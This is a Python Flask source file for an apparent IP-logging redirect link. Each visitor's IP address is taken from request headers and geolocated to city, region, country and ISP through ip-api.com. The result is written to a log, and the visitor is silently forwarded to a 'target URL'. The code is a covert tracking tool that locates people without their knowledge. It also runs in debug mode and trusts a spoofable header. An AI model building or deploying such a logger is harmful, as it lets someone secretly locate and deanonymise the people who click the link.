from flask import Flask, request, redirect
import datetime, requests

app = Flask(__name__)

REDIRECT_URL = "https://example.com"  # change to your target URL

def get_geo_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            data = response.json()
            return {
                "city": data.get("city"),
                "region": data.get("regionName"),
                "country": data.get("country"),
                "isp": data.get("isp")
            }
        else:
            return None
    except Exception:
        return None

@app.route("/")
def log_geo():
    # Grab first public IP from X-Forwarded-For or fallback to remote_addr
    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip = ip_header.split(',')[0].strip()

    # Skip private IPs
    if ip.startswith(("192.168", "10.", "172.")):
        geo_info = {"city": None, "region": None, "country": None, "isp": None}
    else:
        geo_info = get_geo_info(ip)

    # Debug print to Render logs
    print(f"[{datetime.datetime.now()}] Visitor geolocation: {geo_info}")

    # Optionally save to a file
    with open("geo_log.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - {geo_info}\n")

    return redirect(REDIRECT_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
